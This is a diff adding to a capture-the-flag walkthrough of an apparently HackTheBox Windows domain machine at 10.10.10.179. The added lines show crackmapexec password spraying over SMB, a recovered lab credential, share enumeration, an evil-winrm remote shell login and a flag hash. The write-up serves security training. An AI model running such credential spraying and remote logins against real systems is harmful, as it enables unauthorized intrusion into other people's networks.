@@ -365,5 +365,38 @@ MEGACORP\test
 
 Let's try the password here.
 ```
+crackmapexec smb 10.10.10.179 -u n_user.txt -p password.txt
+```
+![[Pasted image 20240924035700.png]]
 
+Salute we got a initial access i think so
+```
+MEGACORP.LOCAL\tushikikatomo:finance1 
+```
+
+User
+```
+tushikikatomo
+```
+
+Password
+```
+finance1 
+```
+
+
+```
+crackmapexec smb 10.10.10.179 -u 'tushikikatomo' -p 'finance1' --shares
+```
+![[Pasted image 20240924040150.png]]
+
+Let's get the initial access as it's time for Evil-winrm
+```
+evil-winrm -u 'tushikikatomo' -p 'finance1' -i 10.10.10.179
+```
+
+![[Pasted image 20240924040538.png]]
+
+```
+5e190d5ee99842b7a37896bad63f948b
 ```
